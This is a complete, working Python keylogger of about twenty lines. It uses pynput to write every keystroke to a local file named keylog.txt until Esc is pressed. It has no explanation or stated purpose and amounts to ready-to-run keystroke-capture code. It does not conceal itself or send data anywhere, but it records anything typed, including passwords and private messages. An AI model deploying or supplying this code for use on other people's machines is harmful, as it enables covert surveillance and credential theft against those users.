from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def write_to_log(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key))
            f.write("\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_press(key):
    write_to_log(key)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
